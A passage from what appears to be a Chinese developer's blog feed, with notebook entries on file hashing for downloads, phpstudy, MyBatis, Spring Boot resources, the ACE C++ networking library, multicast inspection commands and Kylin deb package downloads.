<li>将GB级别的文件分卷压缩，放入文件夹中。</li>
<li>使用HashCalculator工具对文件夹中分卷压缩包进行哈希计算，并将结果保存到文件夹中。</li>
<li>使用Filezilla下载整个文件夹</li>
<li>使用HashCalculator工具对下载的文件夹进行哈希验证，哪个分卷压缩包哈希验证不通过，就重新下载该分卷压缩包。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/508470963?utm_id=0" target="_blank" rel="noopener">数字通信系统模型（重点内容）</a>,by 通信小达人.</li>
<li><a href="https://github.com/hrpzcf/HashCalculator" target="_blank" rel="noopener">HashCalculator</a>,by hrpzcf.</li>
<li><a href="https://forum.filezilla-project.org/viewtopic.php?t=56656" target="_blank" rel="noopener">hash support?</a>,by filezilla.</li>
<li><a href="https://www.cnblogs.com/asdyzh/p/9760164.html" target="_blank" rel="noopener">Filezilla配置FTP中的坑以及出坑办法</a>,by asdyzh.</li>
<li><a href="https://blog.csdn.net/ldq_sd/article/details/121262933" target="_blank" rel="noopener">Windows certutil.exe 命令 简单举例 计算MD5与SHA1/256</a>,by ldq_sd.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy简介</title>
    <url>/2024/03/10/phpstudy%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>最近接触一地方科技公司，他们使用phpstudy在Windows操作系统上部署应用，可以绿色化，无需安装，挺好用的。</p>
<blockquote>
<p>phpstudy 为服务器环境提供最优配置的解决方案, 支持Web端管理，一键创建网站、FTP、数据库、SSL；安全管理，计划任务，文件管理，PHP多版本共存及切换；自带LNMP与LAMP 。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.xp.cn/" target="_blank" rel="noopener">phpstudy</a>,by xp.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis学习笔记</title>
    <url>/2024/03/12/Mybatis%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://mybatis.org/mybatis-3/zh_CN/index.html" target="_blank" rel="noopener">什么是 MyBatis？</a>,by mybatis.</li>
<li><a href="https://juejin.cn/post/7201831345415749692" target="_blank" rel="noopener">MyBatis教程（看这一篇就够了）入门到精通</a></li>
<li><a href="https://www.cnblogs.com/badaoliumangqizhi/p/18024470" target="_blank" rel="noopener">若依前后端分离版如何集成的mybatis以及修改集成mybatisplus实现Mybatis增强</a>,by 霸道流氓.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot学习笔记</title>
    <url>/2024/03/16/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Spring Boot 是一个基于 Java 的开源框架，用于以最小的工作量编写独立的、生产级的基于 Spring 的应用程序。Spring Boot 是 Spring Java 平台的约定优先于配置的扩展，旨在帮助在创建基于 Spring 的应用程序时最大程度地减少配置问题。</p>
<p>由于其易用性和健壮性，它被广泛用于构建微服务、Web 应用程序和其他基于 Java 的项目。</p>
<h1 id="常用工具介绍"><a href="#常用工具介绍" class="headerlink" title="常用工具介绍"></a>常用工具介绍</h1><h2 id="mvn-repository"><a href="#mvn-repository" class="headerlink" title="mvn repository"></a>mvn repository</h2><p>访问地址如下，用于查找Jar包</p>
<ul>
<li><a href="https://mvnrepository.com/" target="_blank" rel="noopener">mvnrepository</a></li>
</ul>
<p>当前很多项目使用mvn打包多模块，请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/swordfall/p/15044415.html" target="_blank" rel="noopener">Maven打包方式（多模块）</a></li>
</ul>
<h2 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h2><h2 id="MyBatis-Plus"><a href="#MyBatis-Plus" class="headerlink" title="MyBatis-Plus"></a>MyBatis-Plus</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_38974638/article/details/119896632" target="_blank" rel="noopener">MyBatis org.apache.ibatis.binding.BindingException: Invalid bound statement (not found)问题解决</a></li>
</ul>
<p>代码生成器新，请参考：</p>
<ul>
<li><a href="https://www.modb.pro/db/619309" target="_blank" rel="noopener">Mybatis Plus最新代码生成器AutoGenerator，更简单更高效！</a></li>
</ul>
<h2 id="SWagger"><a href="#SWagger" class="headerlink" title="SWagger"></a>SWagger</h2><p>Swagger是一个可以根据你的代码，自动生成接口文档的一个工具，并且可以用作接口测试工具。</p>
<p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/ldy1016/article/details/136502829" target="_blank" rel="noopener">springboot3.x集成SpringDoc Swagger3</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/529772728" target="_blank" rel="noopener">从 SpringFox 迁移到 SpringDoc</a></li>
</ul>
<h1 id="分层架构"><a href="#分层架构" class="headerlink" title="分层架构"></a>分层架构</h1><p>参考SprintBoot的分层架构，可以更好的开发企业级应用。请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/2301_78858041/article/details/145834241" target="_blank" rel="noopener">Spring Boot分层架构详解：从Controller到Service再到Mapper的完整流程</a></li>
<li><a href="https://blog.csdn.net/qq_51447496/article/details/132433845" target="_blank" rel="noopener">在Spring Boot开发中使用DTO层</a></li>
<li><a href="https://cloud.tencent.com/developer/article/2323580" target="_blank" rel="noopener">真理大讨论：Service层的接口是不是多此一举？</a></li>
<li><a href="https://blog.csdn.net/qq_26030541/article/details/105063357" target="_blank" rel="noopener">Spring Boot中的业务层（Service）是否要创建接口，以及如果Service有多个实现类，如何让Spring知道该注入哪个Impl类的分析</a></li>
<li><a href="https://www.yanfukun.com/read/springbootdetail/service?wd=Spring" target="_blank" rel="noopener">深入理解Spring Boot的Service层</a></li>
<li><a href="https://cloud.tencent.com/developer/article/2277256" target="_blank" rel="noopener">五个分层维度：Spring Boot 工程分层实战</a></li>
<li><a href="https://blog.csdn.net/qq_34162294/article/details/138265723" target="_blank" rel="noopener">分层设计：Service 层真的需要实现接口吗？</a></li>
<li><a href="https://bbs.huaweicloud.com/blogs/435830" target="_blank" rel="noopener">基于Spring框架的分层解耦详解</a></li>
</ul>
<h1 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h1><blockquote>
<p>在用SpringBoot开发后端服务时，我们一般是提供接口给前端使用，但前端通过浏览器调我们接口时，浏览器会有个同源策略的限制，即协议，域名，端口任一不一样时都会导致跨域，这篇文章主要介绍跨域的几种常用解决方案。</p>
</blockquote>
<p>具体方案请参考：</p>
<ul>
<li><a href="https://juejin.cn/post/7229139006080253989" target="_blank" rel="noopener">SpringBoot 项目解决跨域的几种方案</a></li>
</ul>
<h2 id="测试跨域问题"><a href="#测试跨域问题" class="headerlink" title="测试跨域问题"></a>测试跨域问题</h2><p>注意，当前以下代码无法在最新的Chrome浏览器控制台运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest()</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;localhost:9090&#x2F;user&#39;) &#x2F;&#x2F; 替换请求的方法和地址</span><br><span class="line">xhr.send()</span><br><span class="line">xhr.onreadystatechange &#x3D; function() &#123;</span><br><span class="line">    if (xhr.readyState &#x3D;&#x3D; 4 &amp;&amp; xhr.status &#x3D;&#x3D; 200) &#123;</span><br><span class="line">        console.log(xhr.responseText)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可使用Postman进行跨域测试，请参考：</p>
<ul>
<li><a href="https://apifox.com/apiskills/how-to-test-cors-with-postman/" target="_blank" rel="noopener">Postman 中如何进行跨域（CORS）测试？图文教程</a></li>
</ul>
<p>具体原理是：跨域问题源于浏览器同源策略，Postman 提供了模拟 CORS 请求的便捷方法，通过设置 Origin 字段和测试跨域请求，可检查响应头中的Access-Control-Allow-Origin等信息。</p>
<h1 id="maven父子工程中的依赖引用"><a href="#maven父子工程中的依赖引用" class="headerlink" title="maven父子工程中的依赖引用"></a>maven父子工程中的依赖引用</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/kh6417/article/details/107574545" target="_blank" rel="noopener">一文搞懂maven父子工程中的依赖引用</a></li>
</ul>
<h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="AliasFor注解"><a href="#AliasFor注解" class="headerlink" title="@AliasFor注解"></a>@AliasFor注解</h2><p>请参考：</p>
<ul>
<li><a href="https://juejin.cn/post/6844904153966182407" target="_blank" rel="noopener">SpringBoot深入理解 – @AliasFor注解的作用</a></li>
<li><a href="https://www.cnblogs.com/54chensongxia/p/14385621.html" target="_blank" rel="noopener">@AliasFor 注解</a></li>
<li><a href="https://blog.csdn.net/lipinganq/article/details/79155072" target="_blank" rel="noopener">Spring Boot常用注解（一） - 声明Bean的注解</a></li>
</ul>
<h2 id="Component注解"><a href="#Component注解" class="headerlink" title="@Component注解"></a>@Component注解</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/goodjava2007/article/details/123011212" target="_blank" rel="noopener">SpringBoot - @Component注解使用详解</a></li>
</ul>
<h2 id="Service注解"><a href="#Service注解" class="headerlink" title="@Service注解"></a>@Service注解</h2><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/xrq730/p/5313412.html" target="_blank" rel="noopener">Spring5：@Autowired注解、@Resource注解和@Service注解</a></li>
<li><a href="https://blog.csdn.net/juggle_gap_horse/article/details/128972813" target="_blank" rel="noopener">Spring注解之Service详解</a></li>
</ul>
<h2 id="Configuration注解"><a href="#Configuration注解" class="headerlink" title="@Configuration注解"></a>@Configuration注解</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/albert_xjf/article/details/131411052" target="_blank" rel="noopener">Spring Boot 中的 @Configuration 注解</a></li>
</ul>
<h2 id="Aspect-注解"><a href="#Aspect-注解" class="headerlink" title="@Aspect 注解"></a>@Aspect 注解</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/yujun2023/article/details/133804713" target="_blank" rel="noopener">Spring Boot中的 @Aspect 注解是什么，如何使用</a></li>
<li><a href="https://developer.aliyun.com/article/1150649" target="_blank" rel="noopener">@Aspect结合案例详解（一）</a></li>
<li><a href="https://www.cnblogs.com/sunpeiyu/articles/17378907.html" target="_blank" rel="noopener">基于@Aspect注解实现的SpringBoot AOP源码</a></li>
<li><a href="https://blog.csdn.net/HuffmanTree_J/article/details/119300221" target="_blank" rel="noopener">Spring Boot 自定义注解实现AOP切面织入</a></li>
<li><a href="https://juejin.cn/post/7058468469926264846" target="_blank" rel="noopener">Spring Boot 使用自定义注解实现操作日志的记录</a></li>
<li><a href="https://www.cnblogs.com/zhaojinhui/p/16734291.html" target="_blank" rel="noopener">AOP面向切面编程@Aspect 注解用法</a></li>
<li><a href="https://www.v2ex.com/t/971848" target="_blank" rel="noopener">关于切点表达式中 @annotation 用法的疑问</a></li>
<li><a href="https://www.cnblogs.com/kenx/p/15093310.html" target="_blank" rel="noopener">SpringBoot AOP中JoinPoint的用法和通知切点表达式</a></li>
<li><a href="https://www.cnblogs.com/kenx/p/15088701.html" target="_blank" rel="noopener">SpringBoot Aop 详解和多种使用场景</a></li>
</ul>
<h2 id="RestControllerAdvice注解"><a href="#RestControllerAdvice注解" class="headerlink" title="@RestControllerAdvice注解"></a>@RestControllerAdvice注解</h2><p>请参考：</p>
<ul>
<li><a href="https://juejin.cn/post/7025484367539470344" target="_blank" rel="noopener">RestControllerAdvice注解与全局异常处理</a></li>
</ul>
<h1 id="Actuator"><a href="#Actuator" class="headerlink" title="Actuator"></a>Actuator</h1><blockquote>
<p>在Spring Boot应用中，只需要依赖组件spring-boot-starter-actuator。它提供了很多监控和管理你的Spring Boot应用的HTTP或者JMX端点，并且你可以有选择地开启和关闭部分功能。当你的Spring Boot应用中引入依赖之后，将自动拥有审计、健康检查、Metrics监控等功能。</p>
</blockquote>
<p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/badaoliumangqizhi/p/16164999.html" target="_blank" rel="noopener">SpringBoot中集成Actuator实现监控系统运行状态</a></li>
</ul>
<h1 id="实体类划分"><a href="#实体类划分" class="headerlink" title="实体类划分"></a>实体类划分</h1><blockquote>
<p>在项目应用中，VO对应于页面上需要显示的数据（表单），DO对应于数据库中存储的数据（数据表），DTO对应于除二者之外需要进行传递的数据。</p>
</blockquote>
<ul>
<li><p>VO（View Object）：视图对象，用于展示层，它的作用是把某个指定页面（或组件）的所有数据封装起来。</p>
</li>
<li><p>DTO（Data Transfer Object）：数据传输对象，这个概念来源于J2EE的设计模式，原来的目的是为了EJB的分布式应用提供粗粒度的数据实体，以减少分布式调用的次数，从而提高分布式调用的性能和降低网络负载，但在这里，我泛指用于展示层与服务层之间的数据传输对象。</p>
</li>
<li><p>DO（Domain Object）：领域对象，就是从现实世界中抽象出来的有形或无形的业务实体。</p>
</li>
<li><p>PO（Persistent Object）：持久化对象，它跟持久层（通常是关系型数据库）的数据结构形成一一对应的映射关系，如果持久层是关系型数据库，那么，数据表中的每个字段（或若干个）就对应PO的一个（或若干个）属性。</p>
</li>
</ul>
<p>请参考：</p>
<ul>
<li><a href="https://ruoyi.csdn.net/65714688b8e5f01e1e4424e5.html" target="_blank" rel="noopener">实体类（VO，DO，DTO）的划分</a></li>
</ul>
<h1 id="Spring-Security"><a href="#Spring-Security" class="headerlink" title="Spring Security"></a>Spring Security</h1><p>请参考：</p>
<ul>
<li><a href="https://shusheng007.top/2023/02/15/springsecurity/" target="_blank" rel="noopener">秒懂SpringBoot之全网最易懂的Spring Security教程</a></li>
</ul>
<h1 id="PageHelper分页插件"><a href="#PageHelper分页插件" class="headerlink" title="PageHelper分页插件"></a>PageHelper分页插件</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_31086797/article/details/106628523" target="_blank" rel="noopener">mybatis分页插件PageHelper使用及原理分析</a></li>
<li><a href="https://www.cnblogs.com/JCcccit/p/16868378.html" target="_blank" rel="noopener">Springboot Mybatis使用pageHelper实现分页查询</a></li>
</ul>
<h1 id="代码自动生成"><a href="#代码自动生成" class="headerlink" title="代码自动生成"></a>代码自动生成</h1><p>请参考：</p>
<ul>
<li><a href="https://jishusuishouji.github.io/2017/01/22/java/velocity/%E4%BD%BF%E7%94%A8_Velocity_%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81/" target="_blank" rel="noopener">使用 Velocity 模板引擎快速生成代码</a></li>
</ul>
<h1 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h1><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/wk-missQ1/p/16658710.html" target="_blank" rel="noopener">深入Quartz，更优雅地管理你的定时任务</a></li>
</ul>
<h1 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_44259720/article/details/105381045" target="_blank" rel="noopener">花5分钟过一遍jar包和war包的区别</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://spring.io/projects/spring-boot" target="_blank" rel="noopener">Spring Boot</a>,by spring.</li>
<li><a href="https://www.bilibili.com/video/BV1U44y1W77D/" target="_blank" rel="noopener">从0开始带你手撸一套SpringBoot+Vue后台管理系统，让小白能跟着学会的项目实战</a>,by 程序员青戈.</li>
<li><a href="https://juejin.cn/post/7229139006080253989" target="_blank" rel="noopener">SpringBoot 项目解决跨域的几种方案</a>,by JK凯.</li>
<li><a href="https://blog.csdn.net/ldy1016/article/details/136502829" target="_blank" rel="noopener">springboot3.x集成SpringDoc Swagger3</a>,by 咚咚阳.</li>
<li><a href="https://mvnrepository.com/" target="_blank" rel="noopener">mvnrepository</a>,by mvn.</li>
<li><a href="https://blog.csdn.net/qq_43006591/article/details/103901573" target="_blank" rel="noopener">Spring中 Service和ServiceImpl的选择</a>,by leeindex.</li>
<li><a href="https://blog.csdn.net/2301_78858041/article/details/145834241" target="_blank" rel="noopener">Spring Boot分层架构详解：从Controller到Service再到Mapper的完整流程</a>,by Leaton Lee.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>ACE网络库学习笔记</title>
    <url>/2024/03/20/ACE%E7%BD%91%E7%BB%9C%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>ACE自适配通信环境（ADAPTIVE Communication Environment）是可以自由使用、开放源码的面向对象（OO）框架（Framework），在其中实现了许多用于并发通信软件的核心模式。</p>
<p>ACE提供了一组丰富的可复用C++ Wrapper Facade（包装外观）和框架组件，可跨越多种平台完成通用的通信软件任务，其中包括：事件多路分离和事件处理器分派、信号处理、服务初始化、进程间通信、共享内存管理、消息路由、分布式服务动态（重）配置、并发执行和同步，等等。</p>
<h1 id="ACE-Message-Queue"><a href="#ACE-Message-Queue" class="headerlink" title="ACE_Message_Queue"></a>ACE_Message_Queue</h1><p>ACE消息队列，请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/onlyxuyang/article/details/756346" target="_blank" rel="noopener">使用Message_Queue的经典的“有界缓冲区”的ACE实现</a></li>
</ul>
<h1 id="ACE-Message-Block"><a href="#ACE-Message-Block" class="headerlink" title="ACE_Message_Block"></a>ACE_Message_Block</h1><p>ACE_Message_Block用于构建“固定”和“可变”长度的消息。ACE_Message_Block可以将多条消息连接在一起，形成一个链表，从而支持复合消息。请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/hgwang/p/5940168.html" target="_blank" rel="noopener">ACE_Message_Block消息数据类</a></li>
<li><a href="https://blog.csdn.net/wallwind/article/details/7215230" target="_blank" rel="noopener">ACE_Message_Block—–ACE消息的存储</a></li>
</ul>
<h1 id="ACE-Thread-Manager"><a href="#ACE-Thread-Manager" class="headerlink" title="ACE_Thread_Manager"></a>ACE_Thread_Manager</h1><p>ACE线程管理类，请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/calmreason/article/details/36399697" target="_blank" rel="noopener">ACE_Thread_Manager（v3.12）</a></li>
</ul>
<h1 id="ACE日志设施"><a href="#ACE日志设施" class="headerlink" title="ACE日志设施"></a>ACE日志设施</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/calmreason/article/details/21384545" target="_blank" rel="noopener">使用ACE日志设施（二）详细介绍（v4）</a></li>
</ul>
<h1 id="ACE组播通信"><a href="#ACE组播通信" class="headerlink" title="ACE组播通信"></a>ACE组播通信</h1><p>请参考：</p>
<ul>
<li><a href="https://lyingbo.github.io/2013/04/14/ACE%E7%BB%84%E6%92%AD%E9%80%9A%E4%BF%A1/" target="_blank" rel="noopener">ACE组播通信</a>,by NoName.</li>
<li><a href="https://www.cnblogs.com/wangfengju/p/6172358.html" target="_blank" rel="noopener">linux网络编程之一—–多播（组播）编程 </a>,by 胡永光.</li>
</ul>
<h1 id="问题参考"><a href="#问题参考" class="headerlink" title="问题参考"></a>问题参考</h1><h2 id="ACE静态链接问题"><a href="#ACE静态链接问题" class="headerlink" title="ACE静态链接问题"></a>ACE静态链接问题</h2><p>请参考</p>
<ul>
<li><a href="https://bbs.csdn.net/topics/90295263" target="_blank" rel="noopener">ACE的”error LNK2019: unresolved external symbol”链接错误</a></li>
<li><a href="https://blog.csdn.net/wangyongjun_cn/article/details/5200048" target="_blank" rel="noopener">ACE的开发和使用 - FAQ</a></li>
<li><a href="https://stackoverflow.com/questions/30915000/how-to-solve-unresolved-external-symbol-error-if-nametoindex-in-visual-studio" target="_blank" rel="noopener">How to solve unresolved external symbol error - if_nametoindex in visual studio 2013</a></li>
</ul>
<h2 id="ACE-TCP-Server无法Open的问题"><a href="#ACE-TCP-Server无法Open的问题" class="headerlink" title="ACE TCP Server无法Open的问题"></a>ACE TCP Server无法Open的问题</h2><p>最近突然发现ACE_SOCK_Acceptor.open方法报错，无法初始化，错误代码是10093，通过分析是WSAStartup()未初始化。最后在main函数文件中通过 #include &lt;ace/OS_main.h&gt; 解决。解决原因是该文件中将调用 WSAStartup() 函数初始化。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ACE_INET_Addr commAddr(1500);</span><br><span class="line">if (m_acceptor-&gt;open(commAddr, 1) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">	ACE_DEBUG((LM_ERROR, &quot;errno&#x3D;%d&quot;, ACE_OS::last_error()));</span><br><span class="line">	return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ACE-多网口多播问题"><a href="#ACE-多网口多播问题" class="headerlink" title="ACE 多网口多播问题"></a>ACE 多网口多播问题</h2><p>当多播时存在多个网口，应指定多播绑定的网口。参考如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;ace&#x2F;SOCK_Dgram_Mcast.h&quot;</span><br><span class="line">#include &quot;ace&#x2F;Log_Msg.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        ACE_SOCK_Dgram_Mcast mcast;</span><br><span class="line">        ACE_INET_Addr        srv_addr(&quot;224.0.0.9:520&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;*</span><br><span class="line">        if (mcast.open(srv_addr, &quot;eth0&quot;, 1) &#x3D;&#x3D; -1)</span><br><span class="line">        &#123;</span><br><span class="line">                ACE_ERROR_RETURN((LM_ERROR, &quot;%p&quot;), -1);</span><br><span class="line">        &#125;*&#x2F;</span><br><span class="line"></span><br><span class="line">        mcast.join(srv_addr,1,&quot;eth0&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/peirenlei/article/details/1760445" target="_blank" rel="noopener">ACE 示例2 — Echo Server</a>,by peirenlei.</li>
<li><a href="https://zh.wikipedia.org/zh-cn/ACE%E8%87%AA%E9%80%82%E9%85%8D%E9%80%9A%E4%BF%A1%E7%8E%AF%E5%A2%83" target="_blank" rel="noopener">ACE自适配通信环境</a>,by wikipedia.</li>
<li><a href="https://maodanp.github.io/2016/05/19/server-concurrent/" target="_blank" rel="noopener">服务器并发策略</a>,by maodanp.</li>
<li><a href="https://medium.com/@hnasr/threads-and-connections-in-backend-applications-a225eed3eddb" target="_blank" rel="noopener">Threads and Connections in Backend Applications</a>,by Hussein Nasser.</li>
<li><a href="https://blog.csdn.net/wojiuguowei/article/details/90402403" target="_blank" rel="noopener">error LNK2019: 无法解析的外部符号 “int __cdecl ace_main_i(int,char * * const)” </a>,by 金士顿.</li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2" target="_blank" rel="noopener">Windows Sockets Error Codes</a>,by microsoft.</li>
<li><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winsock/nf-winsock-wsastartup" target="_blank" rel="noopener">WSAStartup 函数 (winsock.h)</a>,by microsoft.</li>
<li><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winsock2/nf-winsock2-socket" target="_blank" rel="noopener">socket 函数 (winsock2.h)</a>,by microsoft.</li>
<li><a href="https://www.cnblogs.com/jacklikedogs/p/4276430.html" target="_blank" rel="noopener">ACE_SOCK</a>,by 咚咚锵锵.</li>
<li><a href="https://stackoverflow.com/questions/16477148/c-winsock-10093-error" target="_blank" rel="noopener">C++ Winsock 10093 error</a>,by stackoverflow.</li>
<li><a href="https://www.dre.vanderbilt.edu/Doxygen/5.7.7/html/ace/a00617.html" target="_blank" rel="noopener">ACE_SOCK_Dgram_Mcast Class Reference</a>,by vanderbilt.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows和Linux查看组播通信的方法</title>
    <url>/2024/03/25/Windows%E5%92%8CLinux%E6%9F%A5%E7%9C%8B%E7%BB%84%E6%92%AD%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近研究一个网络程序，很复杂，用到了组播通信，就想知道其内部组播细节，记录一下相关命令。</p>
<h1 id="Windows查看组播通信命令"><a href="#Windows查看组播通信命令" class="headerlink" title="Windows查看组播通信命令"></a>Windows查看组播通信命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">netsh interface ipv4 show joins</span><br></pre></td></tr></table></figure>

<h1 id="Linux查看组播通信命令"><a href="#Linux查看组播通信命令" class="headerlink" title="Linux查看组播通信命令"></a>Linux查看组播通信命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -g</span><br><span class="line">ip maddr show</span><br><span class="line">ip maddr show dev eth0</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/ludepsea/article/details/103208103" target="_blank" rel="noopener">在windows下查看加入的组播组</a>,by ludepsea.</li>
<li><a href="https://juejin.cn/s/linux%E6%9F%A5%E7%9C%8B%E7%BB%84%E6%92%AD%E4%BF%A1%E6%81%AF" target="_blank" rel="noopener">linux查看组播信息</a>,by juejin.</li>
<li><a href="https://blog.csdn.net/zenkin/article/details/122825788" target="_blank" rel="noopener">2022-02-03–银河麒麟-银河麒麟v4与.netcore安装</a>,by Zen.Wu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Kylin系统下载完整deb包及依赖包</title>
    <url>/2024/04/11/Kylin%E7%B3%BB%E7%BB%9F%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%95%B4deb%E5%8C%85%E5%8F%8A%E4%BE%9D%E8%B5%96%E5%8C%85/</url>
    <content><![CDATA[<p>最近使用Kylin系统做开发，记录一下使用过程。</p>
<h1 id="添加官方软件源"><a href="#添加官方软件源" class="headerlink" title="添加官方软件源"></a>添加官方软件源</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_44681788/article/details/134374628" target="_blank" rel="noopener">银河麒麟V4.0.2添加官方软件源</a></li>
</ul>
<p>主要是修改source.list文件，添加如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;archive.kylinos.cn&#x2F;kylin&#x2F;KYLIN-ALL 4.0.2-desktop main restricted universe multiverse</span><br></pre></td></tr></table></figure>


<h1 id="下载完整deb包及依赖包"><a href="#下载完整deb包及依赖包" class="headerlink" title="下载完整deb包及依赖包"></a>下载完整deb包及依赖包</h1><p>查看virtualbox所依赖的deb包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-cache depends virtualbox</span><br></pre></td></tr></table></figure>

<p>下载virtualbox所依赖的deb包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get download $(apt-cache depends virtualbox | grep -v i386 | grep &quot;依赖&quot; | awk &#39;&#123;print substr($0,11)&#125;&#39;)</span><br></pre></td></tr></table></figure>

<p>安装所有deb包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg -i *.deb</span><br></pre></td></tr></table></figure>

<h1 id="搜索deb包"><a href="#搜索deb包" class="headerlink" title="搜索deb包"></a>搜索deb包</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-cache search virtualbox</span><br></pre></td></tr></table></figure>

<h1 id="查看显卡信息"><a href="#查看显卡信息" class="headerlink" title="查看显卡信息"></a>查看显卡信息</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 方法1</span><br><span class="line">lspci | grep -i vga</span><br><span class="line">lspci | grep -i nvidia</span><br><span class="line">lspci -v -s 00:0f.0</span><br><span class="line"></span><br><span class="line"># 方法2</span><br><span class="line">lshw -C video</span><br><span class="line">lshw -C display</span><br><span class="line">lshw -C video | grep configuration</span><br><span class="line">modinfo vboxvideo</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/ITxiaozhang7/article/details/121671120" target="_blank" rel="noopener">ubuntu 下载完整deb包及依赖包</a>,by lucky科技汪.</li>
<li><a href="https://blog.csdn.net/qq_44681788/article/details/134374628" target="_blank" rel="noopener">银河麒麟V4.0.2添加官方软件源</a>,by 123无敌，就你了.</li>
<li><a href="https://www.cnblogs.com/whxiao/p/16481431.html" target="_blank" rel="noopener">grep,awk,cut 字符串截取</a>,by WH·xiao.</li>
<li><a href="https://www.sysgeek.cn/graphics-card-information-linux/" target="_blank" rel="noopener">Linux中如何查看显卡硬件信息</a>,by 系统极客.</li>
</ol>
]]></content>
      <tags>
